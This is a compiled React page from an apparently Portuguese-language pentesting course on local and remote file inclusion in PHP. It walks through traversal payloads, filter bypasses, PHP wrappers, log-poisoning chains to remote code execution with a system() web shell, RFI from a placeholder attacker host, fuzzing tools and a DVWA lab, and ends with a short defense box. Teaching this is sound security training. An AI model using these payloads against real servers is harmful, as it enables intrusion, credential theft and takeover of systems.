import{j as e}from"./index-CAFCz3B4.js";import{P as t}from"./PageContainer-CxmWgrx_.js";import{A as s}from"./AlertBox-Dze8I6Zt.js";import{C as p}from"./CodeBlock-C6bWIuPM.js";import{C as a}from"./CommandTable-CZCYoWRB.js";import{T as o,P as c}from"./PracticeBox-BDRu97pg.js";function m(){return e.jsxs(t,{title:"LFI / RFI — Local & Remote File Inclusion",subtitle:"Ler arquivos do servidor (LFI) ou incluir arquivos remotos (RFI). Caminho clássico até RCE.",difficulty:"intermediario",timeToRead:"14 min",children:[e.jsx("h2",{children:"O bug"}),e.jsx(p,{language:"php",title:"código vulnerável típico",code:`<?php
// app.php?page=home → include "pages/home.php"
include "pages/" . $_GET['page'] . ".php";

// Se filtro só checa extensão, atacante manda:
// app.php?page=../../../../etc/passwd%00      (PHP < 5.3)
// app.php?page=../../../../etc/passwd
?>`}),e.jsx("h2",{children:"Detecção"}),e.jsx(o,{path:"~",lines:[{cmd:"curl -s 'https://app.local/include.php?page=home'",out:"<h1>Welcome home</h1>...",outType:"info"},{cmd:"curl -s 'https://app.local/include.php?page=../../../../etc/passwd'",out:`root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
ana:x:1000:1000:Ana,,,:/home/ana:/bin/bash`,outType:"warning"}]}),e.jsx("h2",{children:"Arquivos clássicos a tentar"}),e.jsx(a,{title:"LFI cheat — Linux",variations:[{cmd:"/etc/passwd",desc:"Lista de usuários do sistema.",output:"Sempre legível."},{cmd:"/etc/shadow",desc:"Hashes de senha.",output:"Só root lê. www-data NÃO."},{cmd:"/etc/hosts",desc:"Hostnames locais e do domain.",output:"Pode revelar infra interna."},{cmd:"/etc/issue / /etc/os-release",desc:"Versão da distro.",output:"Para selecionar exploit certo."},{cmd:"/etc/passwd, /etc/group",desc:"Mapeamento user↔grupo.",output:"Pivot de privesc."},{cmd:"/proc/self/environ",desc:"Variáveis de ambiente do processo PHP.",output:"Pode ter credentials!"},{cmd:"/proc/self/cmdline",desc:"Linha de comando que iniciou o processo.",output:"Apache, PHP-FPM, etc."},{cmd:"/proc/version",desc:"Versão do kernel.",output:"Para procurar exploit kernel."},{cmd:"/var/log/apache2/access.log",desc:"Log do Apache (poisoning depois).",output:"Pode ler/escrever (LFI to RCE)."},{cmd:"/var/log/apache2/error.log",desc:"Erros do Apache.",output:"Útil para envenenar via User-Agent."},{cmd:"/var/www/html/config.php",desc:"Config do app.",output:"Quase sempre tem credenciais DB."},{cmd:"/var/www/html/.env",desc:"Variáveis de ambiente Laravel/Node.",output:"DB_PASSWORD, JWT_SECRET..."},{cmd:"~/.ssh/id_rsa",desc:"Chave SSH privada.",output:"Login direto se você descobrir o usuário."},{cmd:"~/.bash_history",desc:"Histórico do shell.",output:"Comandos com senhas (mysql -p...)."}]}),e.jsx("h2",{children:"Bypass de filtros"}),e.jsx(o,{path:"~",lines:[{comment:"filtro tira '../'",cmd:"curl -s 'https://app.local/p?file=....//....//etc/passwd'",out:"(remove uma vez '../' → fica '../../etc/passwd')",outType:"info"},{comment:"URL-encoding duplo",cmd:"curl -s 'https://app.local/p?file=%252e%252e%252fetc%252fpasswd'",out:"(servidor decoda 1 vez → '%2e%2e%2fetc%2fpasswd' → ../etc/passwd)",outType:"default"},{comment:"PHP 5 e null byte (legado)",cmd:"curl -s 'https://app.local/p?file=../../../../etc/passwd%00.php'",out:"(sem o null byte, app concatena .php; null byte trunca)",outType:"muted"},{comment:"wrappers do PHP",cmd:"curl -s 'https://app.local/p?file=php://filter/convert.base64-encode/resource=index.php'",out:`PD9waHAKZGVmaW5lKCdEQl9QQVNTV09SRCcsICdTM2NyM3RvIScpOwppbmNsdWRl...

(decoda o b64: <?php define('DB_PASSWORD', 'S3cr3to!'); include ...)`,outType:"warning"}]}),e.jsx(a,{title:"PHP wrappers úteis em LFI",variations:[{cmd:"php://filter/convert.base64-encode/resource=X",desc:"Lê arquivo PHP em b64 (não executa).",output:"Para extrair fonte de .php."},{cmd:"php://input",desc:"Lê o body do POST (RCE se include).",output:`Combine com -X POST -d "<?php system($_GET['c']);?>"`},{cmd:"data://text/plain,<?php phpinfo();?>",desc:"Inline data (RCE direto).",output:"Bloqueado se allow_url_include=Off."},{cmd:"expect://id",desc:"Executa comando (precisa expect ext).",output:"Raro, mas RCE imediato."},{cmd:"phar://uploads/x.zip/x.txt",desc:"Desserialização via PHAR.",output:"RCE via desserialização."},{cmd:"zip://...#x.txt",desc:"Lê arquivo dentro de zip.",output:"Combine com upload."}]}),e.jsx("h2",{children:"LFI → RCE via log poisoning"}),e.jsx(o,{path:"~",lines:[{comment:"1) injetar PHP no User-Agent (vai pro access.log)",cmd:`curl -A '<?php system($_GET["c"]); ?>' https://app.local/`,out:"(silencioso. mas o User-Agent agora está logado)",outType:"muted"},{comment:"2) confirmar que está no log",cmd:"curl -s 'https://app.local/p?file=/var/log/apache2/access.log' | tail -1",out:'192.168.1.42 - - [03/Apr/2026:13:48:14 +0000] "GET / HTTP/1.1" 200 4521 "-" "<?php system($_GET[\\"c\\"]); ?>"',outType:"warning"},{comment:"3) include do log + parâmetro c=cmd → RCE!",cmd:"curl -s 'https://app.local/p?file=/var/log/apache2/access.log&c=id'",out:`(...parte do log...)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
(...)`,outType:"error"}]}),e.jsx("h2",{children:"LFI → RCE via /proc/self/environ"}),e.jsx(o,{path:"~",lines:[{cmd:`curl -A '<?php system($_GET["c"]); ?>' 'https://app.local/p?file=/proc/self/environ&c=id'`,out:`HTTP_USER_AGENT=<?php system($_GET["c"]); ?>
SERVER_SIGNATURE=
HTTP_HOST=app.local
SCRIPT_NAME=/p.php

uid=33(www-data) gid=33(www-data) groups=33(www-data)`,outType:"error"}]}),e.jsx("h2",{children:"LFI → RCE via SSH log (alt)"}),e.jsx(o,{path:"~",lines:[{comment:"tentar logar com username = payload PHP (vai para auth.log)",cmd:`ssh '<?php system($_GET["c"]); ?>'@target.local`,out:"(falha de auth, mas username vai pro log)",outType:"muted"},{cmd:"curl 'https://app.local/p?file=/var/log/auth.log&c=id'",out:`Apr 03 13:55:01 target sshd[1234]: Invalid user <?php system($_GET["c"]); ?> from 192.168.1.42 port 51234

uid=33(www-data) gid=33(www-data) groups=33(www-data)`,outType:"error"}]}),e.jsx("h2",{children:"RFI — quando allow_url_include=On"}),e.jsx(o,{path:"~",lines:[{comment:"1) atacante hospeda payload",cmd:`echo '<?php system($_GET["c"]); ?>' > shell.txt && python3 -m http.server 80`,out:"Serving HTTP on 0.0.0.0 port 80 ...",outType:"default"},{comment:"2) include via URL",cmd:"curl -s 'https://app.local/p?file=http://atacante.com/shell.txt&c=whoami'",out:"www-data",outType:"error"},{comment:"3) confirmar a config (PHP)",cmd:"curl -s 'https://app.local/p?file=http://atacante.com/info.php' && cat info.php",out:`<?php phpinfo(); ?>
(executa phpinfo do remoto)`,outType:"warning"}]}),e.jsxs("p",{children:["Em PHP 7+ o ",e.jsx("code",{children:"allow_url_include"})," é ",e.jsx("code",{children:"Off"})," por padrão — RFI ficou raro. LFI ainda é muito comum."]}),e.jsx("h2",{children:"Ferramentas"}),e.jsx(o,{path:"~",lines:[{cmd:"ffuf -u 'https://app.local/p?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 412",out:`:: Wordlist: FUZZ: LFI-Jhaddix.txt (903 words)

../../../../etc/passwd          [Status: 200, Size: 1245]
../../../../etc/hosts           [Status: 200, Size: 412]
../../../../proc/self/environ   [Status: 200, Size: 2451]`,outType:"info"},{cmd:"lfimap -u 'https://app.local/p?file=PAYLOAD' --all",out:`[+] Found LFI: ../../../../etc/passwd
[+] PHP wrapper available: php://filter
[+] Source code disclosure on /var/www/html/index.php
[+] Detected /proc/self/environ readable
[+] Trying log poisoning RCE...
[+] RCE confirmed via /var/log/apache2/access.log`,outType:"warning"}]}),e.jsx(c,{title:"LFI to RCE em DVWA",goal:"Em DVWA File Inclusion (Low), confirmar leitura arbitrária e escalar para RCE.",steps:["Confirme leitura de /etc/passwd via parameter page=.","Use php://filter para extrair o fonte da página.","Envie User-Agent com payload PHP, leia /var/log/apache2/access.log com c=id para RCE."],command:`URL="http://localhost:8080/vulnerabilities/fi"
COOKIE="PHPSESSID=...; security=low"

curl -s "$URL/?page=../../../../etc/passwd" -b "$COOKIE" | head

curl -s "$URL/?page=php://filter/convert.base64-encode/resource=../../../config/config.inc.php" -b "$COOKIE" | base64 -d

curl -A '<?php system($_GET["c"]); ?>' "$URL/" -b "$COOKIE"
curl -s "$URL/?page=/var/log/apache2/access.log&c=id" -b "$COOKIE" | tail -3`,expected:`root:x:0:0:root:/root:/bin/bash
[...]
$_DVWA[ 'db_user' ]   = 'dvwa';
$_DVWA[ 'db_password' ] = 'p@ssw0rd';
[...]
uid=33(www-data) gid=33(www-data) groups=33(www-data)`,verify:"O password do DVWA db deve aparecer no fonte decodado, e o id retornar uid=33."}),e.jsxs(s,{type:"info",title:"Defesa",children:[e.jsx("code",{children:"Whitelist de páginas válidas"})," é a única defesa robusta. Nunca passe input direto para ",e.jsx("code",{children:"include"}),"/",e.jsx("code",{children:"require"}),". Em PHP, mantenha",e.jsx("code",{children:"allow_url_include=Off"})," e ",e.jsx("code",{children:"allow_url_fopen=Off"})," sempre que possível."]})]})}export{m as default};
